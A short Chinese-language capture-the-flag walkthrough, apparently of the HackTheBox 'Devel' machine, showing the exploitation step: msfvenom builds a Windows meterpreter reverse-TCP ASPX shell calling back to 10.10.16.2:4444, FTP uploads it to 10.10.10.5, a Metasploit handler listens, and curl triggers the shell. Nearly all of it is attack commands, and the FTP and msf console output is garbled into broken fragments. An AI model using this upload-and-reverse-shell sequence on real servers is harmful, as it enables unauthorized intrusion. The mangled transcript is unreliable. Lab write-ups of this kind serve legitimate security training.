## 漏洞利用

```

┌──(root💀kali)-[~/Desktop]# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.2 LPORT=4444 -f aspx -o shell.aspx


```

使用msf生成一个aspx的木马

```

┌──(root💀kali)-[~/Desktop]# ftp 10.10.10.5

in
.type

 is Windows_NT.local
: shell.aspx remote: shell.aspxcommand

 successful.in
 0.00 secs (58.3728 MB/s)
```

然后使用ftp传上去

```
msf6 > set

 payload windows/meterpreter/reverse_tcpset

 lhost 10.10.16.2set

 lport 4444
```

然后使用msf开启端口监听

```

┌──(root💀kali)-[~/Desktop/HTB/Easy/Devel]# curl http://10.10.10.5/shell.aspx

```

然后访问我们上传的aspx马

```


msf6 exploit(multi/handler) > exploit 
```

成功拿到shell
